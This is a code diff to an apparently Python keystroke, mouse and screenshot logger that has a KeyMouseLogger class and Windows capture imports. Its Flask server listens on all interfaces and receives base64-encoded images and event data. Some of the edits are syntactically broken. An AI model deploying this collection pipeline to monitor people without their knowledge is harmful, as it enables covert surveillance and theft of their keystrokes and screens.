@@ -58,7 +58,7 @@ class KeyMouseLogger(object):
 
 # # ------------------------------------------------------------------------------------
 import time
-# import base64
+import base64
 import win32ui
 import win32gui
 import win32con
@@ -152,15 +152,18 @@ import datetime
 
 from flask import request, Flask
 
+node = Flask(__name__)
+@node.route(event_json, methods = ['POST'])
+
 class FlaskServer(object):
     """
     Flask Server
-    """
-    node = Flask(__name__)
-    @node.route(event_json, methods = ['POST'])
 
-    def __init__(self) -> None:
-        pass
+    Usage:
+        python monitor_logger.py flask_server_json
+    """
+    def __init__(self):
+        node.run(host = '0.0.0.0', port = 5000) # 默认端口 5000
 
     def b64_img(self, b64):
         b4code = bytes(b64, 'utf-8')
@@ -183,10 +186,6 @@ class FlaskServer(object):
             logger.info('got data')
             return
 
-    def main(self):
-        node = FlaskServer
-        node.run(host = '0.0.0.0') # 默认端口 5000
 
-# if __name__ == '__main__':
-#     fire.Fire(FlaskServer)
-# python3 keyset_a_mouse.py show_ips --ips_filepath /tmp/ips.txt
+if __name__ == '__main__':
+    fire.Fire(MonitorLogger)
